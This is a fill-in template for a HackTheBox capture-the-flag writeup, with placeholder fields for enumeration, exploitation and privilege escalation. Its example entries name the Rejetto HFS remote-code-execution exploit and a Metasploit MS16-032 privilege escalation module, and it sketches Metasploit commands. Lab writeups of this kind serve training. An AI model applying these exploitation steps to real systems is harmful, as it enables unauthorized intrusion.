# [BOX_NAME] — HackTheBox Writeup

**Date:** [DATE]  
**Prepared By:** [YOUR_NAME]  
**Difficulty:** [Easy / Medium / Hard / Insane]  
**OS:** [Windows / Linux]  
**IP Address:** [TARGET_IP]

---

## Synopsis

[BOX_NAME] is a [difficulty]-level machine which focuses on [brief description of the main theme/attack surface]. [One or two sentences summarizing the attack chain and why this box is notable.]

**Attack Chain:** [e.g., RCE via CVE-XXXX-XXXX → Metasploit privesc module]

---

## Skills Required

- [Skill 1, e.g., Basic knowledge of Windows]
- [Skill 2, e.g., Enumerating ports and services]

## Skills Learned

- [Skill 1, e.g., Identifying vulnerable services]
- [Skill 2, e.g., Identifying known exploits]
- [Skill 3, e.g., Basic privilege escalation techniques]

---

## Enumeration

### Nmap

```bash
nmap -T4 -A -v [TARGET_IP]
```

**Key findings:**

| Port | Protocol | State | Service | Version |
|------|----------|-------|---------|---------|
| [PORT] | tcp | open | [SERVICE] | [VERSION] |

[Brief summary of what nmap revealed and why it matters. e.g., "Only port 80 is open, running HttpFileServer 2.3 — a quick search reveals this version is vulnerable to RCE (CVE-XXXX-XXXX)."]

### [Additional Enumeration Tool / Step, if needed]

```bash
[command]
```

[Output / findings]

---

## Exploitation

**Vulnerability:** [CVE or description, e.g., CVE-2014-6287 — Rejetto HFS RCE]  
**Module / Tool:** [e.g., exploit/windows/http/rejetto_hfs_exec]  
**Reference:** [Link to exploit-db, GitHub, etc.]

```bash
# Metasploit example
use [exploit/path/module]
set RHOST [TARGET_IP]
set LHOST [YOUR_IP]
run
```

[Brief description of what the exploit does and confirmation of successful shell, e.g., "The module sends a malicious request triggering RCE and returns a Meterpreter session as MACHINE\user."]

```
meterpreter > getuid
Server username: [MACHINE\USER]
```

### User Flag

```
[FLAG_PATH, e.g., C:\Users\kostas\Desktop\user.txt]
```

`user.txt` → `[REDACTED]`

---

## Privilege Escalation

### Enumeration

[Describe how you identified the privesc vector. e.g., "Running `sysinfo` revealed a Windows 2012 R2 x64 target. Migrated to an x64 process first to avoid architecture mismatches."]

```bash
# Example: migrate to x64 process in Meterpreter
meterpreter > ps
meterpreter > migrate [PID_OF_X64_PROCESS]
```

### Exploitation

**Module / Exploit:** [e.g., exploit/windows/local/ms16_032_secondary_logon_handle_privesc]  
**CVE:** [CVE-XXXX-XXXX if applicable]

```bash
use [exploit/path/privesc_module]
set SESSION [SESSION_ID]
run
```

[Confirmation of elevated shell]

```
C:\> whoami
nt authority\system
```

### Root Flag

```
[FLAG_PATH, e.g., C:\Users\Administrator\Desktop\root.txt]
```

`root.txt` → `[REDACTED]`

---

## Summary

| Step | Method | Result |
|------|--------|--------|
| Enumeration | nmap | Found [SERVICE] on port [PORT] |
| Foothold | [CVE / Exploit name] | Shell as [USER] |
| Privesc | [Module / technique] | Shell as SYSTEM / root |

---

*Writeup by [YOUR_NAME] — [DATE]*
